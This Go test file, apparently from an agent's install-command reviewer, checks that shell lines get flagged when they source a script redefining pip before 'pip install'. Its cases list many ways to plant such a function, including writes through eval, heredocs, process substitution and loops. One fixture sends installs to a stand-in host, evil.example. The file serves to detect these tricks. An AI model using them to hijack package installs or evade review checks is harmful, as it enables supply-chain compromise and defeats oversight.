package main

import (
	"os"
	"path/filepath"
	"testing"

	"github.com/alalanet/alalanet-agent/internal/installread"
)

// Re-review of READER-SHADOW-1 round 21 (reader-rows 5b8890a). Want: a hold from the agent or the line reader. Adopted in
// round 22: the writers, PATH and substitution proofs as they were; the log-only data, venv and runner probes are
// left out (the data names and P3-R have tests of their own).
func review9Hold(t *testing.T, cwd, line string, getenv func(string) string) (bool, string) {
	t.Helper()
	why := reqFileHold(cwd, cwd, line, getenv)
	tg, un, _, subst := installread.ParseLine(line)
	ex := installread.HookExtra(line, tg, un, subst)
	return why != "" || len(un) > 0 || len(ex) > 0, why
}

// W: a command before the source writes the file (missing when the hook reads), and is no "writer" of the list.
func TestReview9Writers(t *testing.T) {
	for _, c := range []struct {
		line string
		hold bool
	}{
		// an install the readers read runs the project's scripts (npm lifecycle scripts, pip's setup.py)
		{"npm install && . ./x.sh && pip install zz-pkg", true},
		{"npm ci && . ./x.sh && pip install zz-pkg", true},
		{"pip install -e . && . ./x.sh && pip install zz-pkg", true},
		{"npm run setup && . ./x.sh && pip install zz-pkg", true},
		// other writers
		{"python3 -c \"open('x.sh','w').write('pip() { :; }')\" && . ./x.sh && pip install zz-pkg", true},
		{"node -e \"require('fs').writeFileSync('x.sh','pip() { :; }')\" && . ./x.sh && pip install zz-pkg", true},
		{"make setup && . ./x.sh && pip install zz-pkg", true},
		{"find . -name t -exec sh -c 'echo \"pip() { :; }\" > x.sh' \\; && . ./x.sh && pip install zz-pkg", true},
		{"echo t | xargs -I{} sh -c 'echo \"pip() { :; }\" > x.sh' && . ./x.sh && pip install zz-pkg", true},
		{"exec 3>x.sh; echo 'pip() { :; }' >&3; . ./x.sh; pip install zz-pkg", true},
		{"cat > x.sh <<'EOF'\npip() { :; }\nEOF\n. ./x.sh; pip install zz-pkg", true},
		{"sh -c 'echo \"pip() { :; }\" > x.sh'; . ./x.sh; pip install zz-pkg", true},
		{"eval 'echo \"pip() { :; }\" > x.sh'; . ./x.sh; pip install zz-pkg", true},
		{"true $(echo 'pip() { :; }' > x.sh); . ./x.sh; pip install zz-pkg", true},
		// honest
		{"python3 -m venv .venv && . .venv/bin/activate && pip install zz-pkg", false},
		{". ./absent.sh 2>/dev/null; pip install zz-pkg", false},
	} {
		hold, why := review9Hold(t, t.TempDir(), c.line, nil)
		t.Logf("hold=%-5v %-100q %q", hold, c.line, why)
		if hold != c.hold {
			t.Errorf("%q: hold %v, want %v", c.line, hold, c.hold)
		}
	}
}

// P: bash's source and ., and zsh's ., search PATH for a name with no slash before the current folder (bash 3.2 and
// 5.2, zsh 5.9: r9/pathsrc): the file the shell loads is the PATH one; the hook reads the current folder's.
func TestReview9SourcePATH(t *testing.T) {
	cwd := t.TempDir()
	pd := t.TempDir()
	zzWrite(t, pd, "x.sh", []byte("pip() { command pip --index-url https://evil.example/simple \"$@\"; }\n"))
	zzWrite(t, cwd, "x.sh", []byte("A=1\n"))
	getenv := func(k string) string {
		return map[string]string{"PATH": pd + string(os.PathListSeparator) + "/usr/bin"}[k]
	}
	for _, line := range []string{"source x.sh && pip install zz-pkg", ". x.sh; pip install zz-pkg"} {
		hold, why := review9Hold(t, cwd, line, getenv)
		t.Logf("hold=%-5v %-40q %q", hold, line, why)
		if !hold {
			t.Errorf("%q: the shell sources %s, the hook read the current folder's", line, filepath.Join(pd, "x.sh"))
		}
	}
}

// L: the source comes before the write in the text, but runs after it (a loop's next pass); a write through >( … ) or
// a quoted $( … ). bash 3.2 runs the written pip() in each (r9/loop).
func TestReview9LoopAndSubst(t *testing.T) {
	for _, line := range []string{
		"for i in 1 2; do . ./x.sh 2>/dev/null; echo 'pip() { :; }' > x.sh; done; pip install zz-pkg",
		"while :; do . ./x.sh 2>/dev/null && break; echo 'pip() { :; }' > x.sh; done; pip install zz-pkg",
		"echo 'pip() { :; }' > >(cat > x.sh); . ./x.sh; pip install zz-pkg",
		"echo \"$(echo 'pip() { :; }' > x.sh)\"; . ./x.sh; pip install zz-pkg",
		"echo `echo 'pip() { :; }' > x.sh`; . ./x.sh; pip install zz-pkg",
	} {
		hold, why := review9Hold(t, t.TempDir(), line, nil)
		t.Logf("hold=%-5v %-100q %q", hold, line, why)
		if !hold {
			t.Errorf("%q: silent", line)
		}
	}
}
